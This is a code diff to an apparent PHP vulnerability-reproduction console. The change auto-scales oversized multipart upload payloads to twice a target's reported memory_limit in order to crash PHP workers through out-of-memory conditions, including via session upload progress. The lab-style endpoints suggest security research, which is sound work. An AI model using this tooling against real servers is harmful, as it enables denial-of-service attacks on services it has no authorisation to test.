@@ -25,6 +25,25 @@ from session_progress_probe import (
     request as session_request,
 )
 
+
+def parse_php_size(s):
+    s = str(s).strip()
+    if s == '-1':
+        return -1
+    units = {'K': 1024, 'M': 1024**2, 'G': 1024**3}
+    if s and s[-1].upper() in units:
+        return int(s[:-1]) * units[s[-1].upper()]
+    return int(s)
+
+
+def human_size(n):
+    for unit in ('B', 'KiB', 'MiB', 'GiB'):
+        if abs(n) < 1024:
+            return f"{n:.0f} {unit}" if n == int(n) else f"{n:.1f} {unit}"
+        n /= 1024
+    return f"{n:.1f} TiB"
+
+
 BANNER = r"""
   ____  _   _ ____                _ ____       ____
  |  _ \| | | |  _ \      _   _ _(_)  _ \  ___/ ___|
@@ -59,7 +78,7 @@ Commands:
 """
 
 SET_HELP = """
-Settable parameters:
+Settable parameters (auto-scaled on first health check):
   health <path>               Health endpoint (default: health.php)
   upload <path>               Upload endpoint (default: upload.php)
   producer <path>             Fatal producer endpoint (default: fatal-backtrace.php)
@@ -67,10 +86,10 @@ Settable parameters:
   seed <path>                 Session seed endpoint (default: session/session-seed.php)
   session-health <path>       Session health endpoint (default: session/health.php)
   session-upload <path>       Session upload endpoint (default: session/upload.php)
-  part-headers <n>            Part header count for OOM (default: 5000)
-  empty-files <n>             Empty file count for OOM (default: 500)
-  field-bytes <n>             Form value size for OOM (default: 6291456)
-  timeout <seconds>           Request timeout (default: 15)
+  part-headers <n>            Part header count for OOM (auto: 2x memory_limit / 100)
+  empty-files <n>             Empty file count for OOM (auto: 2x memory_limit / 600)
+  field-bytes <n>             Form value / pad size for OOM (auto: 2x memory_limit)
+  timeout <seconds>           Request timeout (default: 60)
   expected-php <version>      Expected PHP version (default: 8.5.11)
 """
 
@@ -88,12 +107,13 @@ class Console:
             "session-health": "session/health.php",
             "session-upload": "session/upload.php",
         }
-        self.part_headers = 5000
-        self.empty_files = 500
-        self.field_bytes = 6 * 1024 * 1024
+        self.target_mem_limit = None
+        self.part_headers = 2_000_000
+        self.empty_files = 200_000
+        self.field_bytes = 256 * 1024 * 1024
         self.pad_kib = 1340
         self.field_name_kib = 700
-        self.timeout = 15.0
+        self.timeout = 60.0
         self.expected_php = "8.5.11"
 
     def path(self, name):
@@ -134,6 +154,24 @@ class Console:
             except Exception as exc:
                 print(f"\033[91mError: {exc}\033[0m")
 
+    def _detect_mem_limit(self, body_prefix):
+        try:
+            data = json.loads(body_prefix)
+            mem_str = data.get("memory_limit")
+            if not mem_str:
+                return
+            mem = parse_php_size(mem_str)
+            if mem <= 0:
+                return
+            self.target_mem_limit = mem
+            self.field_bytes = mem * 2
+            self.part_headers = max(mem // 100, 500_000)
+            self.empty_files = max(mem // 600, 100_000)
+            self.timeout = max(self.timeout, 60.0)
+            print(f"  \033[93mAuto-scaled payload to 2x {mem_str} ({human_size(self.field_bytes)})\033[0m")
+        except (json.JSONDecodeError, ValueError, TypeError):
+            pass
+
     def require_target(self):
         if self.target is None:
             raise RuntimeError("No target set. Use: target <url>")
@@ -153,11 +191,13 @@ class Console:
 
     def cmd_show(self):
         print(f"  target:        {self.target or '(not set)'}")
+        mem = human_size(self.target_mem_limit) if self.target_mem_limit else "(unknown)"
+        print(f"  memory_limit:  {mem}")
         for k, v in self.endpoints.items():
             print(f"  {k:16s} {v}")
-        print(f"  part-headers:  {self.part_headers}")
-        print(f"  empty-files:   {self.empty_files}")
-        print(f"  field-bytes:   {self.field_bytes}")
+        print(f"  part-headers:  {self.part_headers:,}")
+        print(f"  empty-files:   {self.empty_files:,}")
+        print(f"  field-bytes:   {self.field_bytes:,} ({human_size(self.field_bytes)})")
         print(f"  timeout:       {self.timeout}s")
         print(f"  expected-php:  {self.expected_php}")
 
@@ -170,14 +210,17 @@ class Console:
             print(f"\033[91m{result['transport_error']}\033[0m")
             return
         print(f"HTTP {result['http_status']} ({result['elapsed_ms']}ms)")
+        body_prefix = result.get("body_prefix", "")
         try:
-            data = json.loads(result.get("body_prefix", ""))
+            data = json.loads(body_prefix)
             print(f"  PHP:  {data.get('php')}")
             print(f"  SAPI: {data.get('sapi')}")
             print(f"  PID:  {data.get('pid')}")
             print(f"  Mem:  {data.get('memory_limit')}")
+            if self.target_mem_limit is None:
+                self._detect_mem_limit(body_prefix)
         except json.JSONDecodeError:
-            print(f"  Body: {result.get('body_prefix', '')[:200]}")
+            print(f"  Body: {body_prefix[:200]}")
 
     def cmd_109618(self, strategy=None):
         self.require_target()
@@ -199,9 +242,12 @@ class Console:
                         self.path("health"), self.timeout, None, "baseline")
         pid_before = baseline.get("worker_pid_header", "?")
         print(f"  PID: {pid_before}, HTTP {baseline.get('http_status', 'error')}")
+        if self.target_mem_limit is None:
+            self._detect_mem_limit(baseline.get("body_prefix", ""))
 
+        print(f"Generating payload (field-bytes={human_size(self.field_bytes)}, part-headers={self.part_headers:,})...")
         body = strategies[strategy]()
-        print(f"Step 2: Sending {len(body):,} byte multipart ({strategy})...")
+        print(f"Step 2: Sending {human_size(len(body))} multipart ({strategy})...")
         result = send(self.scheme, self.host, self.port, "POST",
                       self.path("upload"), self.timeout, None, "oom-candidate",
                       body, f"multipart/form-data; boundary={BOUNDARY}")
@@ -266,6 +312,8 @@ class Console:
             return
         pid_before = health.get("worker_pid_header", "?")
         print(f"  PID: {pid_before}, HTTP {health.get('http_status')}")
+        if self.target_mem_limit is None:
+            self._detect_mem_limit(health.get("body_prefix", ""))
 
         print("Step 2: Acquiring session cookie...")
         seed, set_cookie = session_request(self.scheme, self.host, self.port, "GET",
@@ -280,7 +328,7 @@ class Console:
         print(f"  Got session cookie")
 
         producer_body = multipart_producer(self.field_bytes, "candidate")
-        print(f"Step 3: Producer (OOM with session progress, {len(producer_body):,} bytes)...")
+        print(f"Step 3: Producer (OOM with session progress, {human_size(len(producer_body))})...")
         producer, _ = session_request(self.scheme, self.host, self.port, "POST",
                                       self.path("session-upload"), body=producer_body,
                                       cookie=cookie, timeout=self.timeout)
